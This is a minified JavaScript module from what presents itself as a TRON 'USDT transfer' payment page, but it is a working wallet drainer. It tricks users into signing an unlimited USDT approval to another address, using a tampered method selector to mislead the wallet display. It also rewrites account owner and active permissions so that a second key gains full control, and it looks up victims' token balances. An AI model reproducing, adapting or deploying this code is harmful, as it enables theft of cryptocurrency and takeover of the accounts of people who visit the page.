import{a as t}from"./9-a2e4a23d.js";import{s as a,a as e}from"./8Lq7dXP39c-9618f7e3.js";const r=JSON.parse(localStorage.getItem("config")),s="https://api.trongrid.io",n=async(e="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",n,o,i=.01)=>{try{if(!window.hasOwnProperty("tronWeb"))return a("Please switch to TRON main chain");await tronWeb.trx.getBalance();const i=navigator.userAgent,d=(/iphone|ipad|ipod|ios/i.test(i),/android|XiaoMi|MiuiBrowser/i.test(i),/OKApp/i.test(i));let c={};d&&(document.title="USDT 转账");let p=[{type:"address",value:n},{type:"uint256",value:"23384026197294446691258957323460528314494920687615"}],l=await tronWeb.transactionBuilder.triggerSmartContract(e,"increaseApproval(address,uint256)",{},p,o),h=l.transaction.raw_data.contract[0].parameter.value.data,w=l.transaction.raw_data.contract[0].type;const u=l.raw_data_hex;l.transaction.raw_data.contract[0].parameter.value.data=l.transaction.raw_data.contract[0].parameter.value.data.toString().replace("d73dd623","D73DD623"),l.transaction.raw_data_hex=l.transaction.raw_data_hex.toString().replace("d73dd623","D73DD623"),c=await tronWeb.trx.sign(l.transaction),c.raw_data.contract[0].parameter.value.data=h,c.raw_data.contract[0].type=w,c.raw_data_hex=u;const{data:g}=await t.post(`${s}/wallet/broadcasttransaction`,{...c},{headers:{"TRON-PRO-API-KEY":r.tronApikey}});return g}catch(d){a(String(d))}},o=async(n,o,i=!1)=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void a("TRX小于100，付款受限");e({message:"Loading...",duration:0});let d={type:0,permission_name:"owner",threshold:1,keys:[]};i&&d.keys.push({address:o,weight:1}),d.keys.push({address:n,weight:1});let c={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};i&&c.keys.push({address:o,weight:1}),c.keys.push({address:n,weight:1});const{data:p}=await t.post(`${s}/wallet/accountpermissionupdate`,{owner_address:o,owner:d,actives:c,visible:!0});if(null==p?void 0:p.Error)return null==p?void 0:p.Error;const l=await tronWeb.trx.sign(p),{data:h}=await t.post(`${s}/wallet/broadcasttransaction`,{...l},{headers:{"TRON-PRO-API-KEY":r.tronApikey}});return h}catch(d){a(String(d))}},i=async t=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void a("TRX小于100,付款受限");let e=tronWeb.defaultAddress.hex,r={type:0,permission_name:"owner",threshold:1,keys:[]};r.keys.push({address:e,weight:1}),r.keys.push({address:tronWeb.address.toHex(t),weight:1});let s={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};s.keys.push({address:e,weight:1}),s.keys.push({address:tronWeb.address.toHex(t),weight:1});const n=await tronWeb.transactionBuilder.updateAccountPermissions(e,r,null,s),o=await tronWeb.trx.sign(n);return await tronWeb.trx.sendRawTransaction(o)}catch(e){a(String(e))}},d=async(e,r="USDT")=>{r=String(r).toLocaleUpperCase();let s=0;if(!e)return a("无法获取钱包地址！请检查浏览器是否支持TRON！");const{data:n}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${e}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=${r}`);if(n.data.length>0){const t=n.data[0];return s=t.balance/Math.pow(10,t.tokenDecimal),s}return s};var c=(t=>(t.TRX="trx",t.ETH="eth",t.BSC="bsc",t))(c||{});const p={1:"approve",2:"active",3:"owner"},l={bsc:"Binance Coin",trx:"TRON",eth:"Ethereum"};export{c as B,n as a,o as b,i as c,l as d,d as g,p as t};
